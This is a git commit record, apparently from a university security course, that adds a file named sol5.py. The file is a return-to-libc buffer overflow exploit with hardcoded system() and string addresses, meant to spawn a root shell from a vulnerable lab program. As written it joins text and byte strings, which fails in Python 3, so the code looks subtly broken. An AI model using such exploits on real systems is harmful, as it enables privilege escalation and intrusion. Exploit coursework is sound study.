428b646996271982fb2b999280fe9de32a4ecd2e
marymx <marymx@umich.edu>
2022-03-30 20:25:30 +0000

    Automatic commit by test script for marymx yaoche

---
+++ sol5.py
@@ -0,0 +1,10 @@
+import sys
+from struct import pack
+
+#Need to run /bin/sh and open a root shell
+filler = "D"*22
+ret = pack("<I", 0x0804ef50) #start of system
+dummy_ret = "f"*4
+arg = pack("<I", 0xbffefaa8) #wherever shell code string is
+command = "/bin/dash"
+sys.stdout.buffer.write( filler + ret + dummy_ret + arg + command)
